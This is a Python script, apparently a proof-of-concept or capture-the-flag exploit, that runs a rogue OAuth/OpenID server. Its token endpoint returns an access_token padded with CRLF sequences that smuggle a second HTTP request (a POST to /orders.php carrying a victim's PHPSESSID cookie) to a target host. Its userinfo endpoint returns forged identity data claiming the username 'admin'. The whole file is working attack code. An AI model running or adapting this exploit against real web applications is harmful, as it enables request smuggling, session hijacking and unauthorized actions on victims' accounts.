
from http.server import SimpleHTTPRequestHandler, HTTPServer
import socketserver
import requests
import json
import urllib.parse as parse
import sys

# Simple HTTP server for serving the exploit
# Usage: python web.py
# Note: This script requires Python 3.x


PORT = int(sys.argv[1])
TARGET_URI = sys.argv[2]
PHPSESSION = sys.argv[3]
LENGTH = sys.argv[4]
class ExHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path.endswith("/token"):
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(
                json.dumps({
                    "access_token": f"aa\r\n\r\n\r\n" 
                                    f"POST /orders.php HTTP/1.0\r\n"
                                    f"Host: {TARGET_URI}\r\n"
                                    f"Content-Type: multipart/form-data; boundary=----\r\n"
                                    f"Content-Length: {LENGTH}\r\n"
                                    f"Cookie: PHPSESSID={PHPSESSION}\r\n"
                                    f"\r\n"
                                    f"------\r\n"
                                    f"Content-Disposition: form-data; name=\"name\"\r\n"
                                    f"\r\n",
                    "refresh_token": "bb"
                }).encode("utf-8")
            )
            return
        
        elif self.path.endswith("/userinfo"):
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(
                json.dumps({
                    "sub": "zzzz",
                    "email_verified": False,
                    "name": "qwe1 qwe2",
                    "preferred_username": "admin",
                    "given_name": "qwe1",
                    "family_name": "qwe2",
                    "email": "qwe@a.com"
                }).encode("utf-8")
            )
            return
            
        return SimpleHTTPRequestHandler.do_GET(self)


def start_server():
    httpd = socketserver.TCPServer(("", PORT), ExHandler)
    httpd.serve_forever()

print("Serving exploit at port", PORT)
start_server()


